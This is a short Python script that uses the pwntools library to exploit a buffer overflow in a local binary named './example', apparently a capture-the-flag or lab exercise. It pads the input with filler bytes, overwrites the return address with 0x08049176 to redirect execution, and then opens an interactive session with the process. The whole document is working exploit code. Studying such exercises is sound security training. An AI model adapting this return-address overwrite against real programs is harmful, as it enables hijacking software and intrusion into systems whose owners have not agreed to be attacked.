from pwn import *

p = process('./example')
target = 0x08049176
payload = b'A' * 12 + b'XXXX' + b'XXXX' + b'XXXX' + p32(target)

p.sendline(payload)
p.interactive()